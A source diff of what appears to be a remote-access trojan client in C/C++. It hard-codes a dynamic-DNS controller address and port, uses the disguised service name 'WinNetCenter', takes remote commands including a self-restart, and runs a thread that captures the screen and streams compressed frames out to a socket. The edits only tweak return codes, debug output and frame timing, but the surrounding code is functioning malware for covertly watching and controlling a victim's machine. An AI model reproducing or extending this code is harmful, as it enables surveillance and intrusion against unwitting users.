@@ -24,10 +24,10 @@ struct MODIFY_DATA
 	char  strSvrDesc[100];  //服务描述							281
 	char  ServerAddr[100];	//Client Addr						381
 	int   ServerPort;		//Client port						481
-}modify_data =
+} modify_data =
 {
 	"lkyfire.vicp.net:80",
-	"20150913",
+	"20170506",
 	vipid,
 	FALSE,
 	"WinNetCenter",
@@ -184,7 +184,7 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
 		{
 			shutdown(MainSocket, 0x02);
 			closesocket(MainSocket);
-			return -1;
+			return STATE_EXIT;
 		}
 
 		case CMD_RESTART:
@@ -197,7 +197,7 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
 			GetModuleFileNameA(GetModuleHandle(NULL), SelfPath, 128);
 			WinExec(SelfPath, 0);
 
-			return -1;
+			return STATE_EXIT;
 		}
 
 #ifdef LxPower
@@ -525,7 +525,7 @@ DWORD _stdcall ScreenThread(LPVOID lParam)
 	lenthCompress = compressBound(lenthUncompress); //(unsigned long)((lenthUncompress+12)*1.1);
 	m_ScreenXor.CaputreFrameFirst(0);                                        //抓取当前帧
 	Sleep(15);
-	::compress(pDataCompress, &lenthCompress, m_ScreenXor.GetBmpData(), lenthUncompress);
+	compress(pDataCompress, &lenthCompress, m_ScreenXor.GetBmpData(), lenthUncompress);
 
 	msgHead.dwCmd = dwFrameID++;              //当前帧号
 	msgHead.dwSize = lenthCompress;            //传输的数据长度
@@ -536,7 +536,7 @@ DWORD _stdcall ScreenThread(LPVOID lParam)
 
 	while (bNotStop)
 	{
-		DWORD dwLastSend = GetTickCount();
+		//DWORD dwLastSend = GetTickCount();
 
 		lenthCompress = compressBound(lenthUncompress); //(unsigned long)((lenthUncompress+12)*1.1);
 		m_ScreenXor.CaputreFrameNext(dwFrameID);
@@ -549,9 +549,10 @@ DWORD _stdcall ScreenThread(LPVOID lParam)
 		msgHead.dwExtend2 = lenthCompress;            //压缩后长度
 
 		bNotStop = SendMsg(ScreenSocket, (char*)pDataCompress, &msgHead);
+		Dbp("Size: %d", lenthCompress);
 
-		if ((GetTickCount() - dwLastSend) < 160)
-			Sleep(150);
+		//if ((GetTickCount() - dwLastSend) < 160) Sleep(150);
+		Sleep(125);
 	}
 
 	//Release Mem and Handle
@@ -888,7 +889,6 @@ LONG _stdcall Errdo(_EXCEPTION_POINTERS *ExceptionInfo)
 	return EXCEPTION_EXECUTE_HANDLER;
 }
 
-
 DWORD WINAPI RoutineMain(LPVOID lp)
 {
 	TCHAR ModulePath[MAX_PATH * 2];
@@ -910,7 +910,7 @@ DWORD WINAPI RoutineMain(LPVOID lp)
 		//lstrcpy(modify_data.ServerAddr, "lkyfire.vicp.net");	//192.168.1.145
 	}
 
-	int state = 1;
+	DWORD state = 1;
 
 	while (true)
 	{
@@ -931,10 +931,10 @@ DWORD WINAPI RoutineMain(LPVOID lp)
 		{
 			Sleep(30 * 1000);
 		}
-		else if (state == -1) //Exit
+		else if (state == STATE_EXIT) //Exit
 		{
-			DbpErr("Exit Request");
-			return -1;
+			Dbp("Exit Request");
+			return STATE_EXIT;
 		}
 
 		Sleep(1000);
